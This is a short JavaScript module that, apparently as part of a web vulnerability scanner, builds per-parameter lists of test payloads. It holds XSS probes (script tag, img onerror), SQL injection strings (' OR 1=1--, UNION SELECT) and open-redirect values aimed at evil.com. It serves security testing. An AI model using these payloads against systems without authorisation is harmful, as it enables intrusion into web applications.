export function generatePayloads(parameters = []) {

  const payloads = []

  for (const param of parameters) {

    // 🔥 FIX: support BOTH string + object
    const paramName = typeof param === "string"
      ? param
      : param.name || ""

    const name = paramName.toLowerCase()

    payloads.push({
      parameter: paramName,
      payloads: {

        XSS: [
          "<script>alert(1)</script>",
          "\"><img src=x onerror=alert(1)>"
        ],

        SQLi: [
          "' OR 1=1--",
          "' UNION SELECT NULL--"
        ],

        OpenRedirect: [
          "https://evil.com",
          "//evil.com"
        ]

      }
    })

  }

  return payloads

}
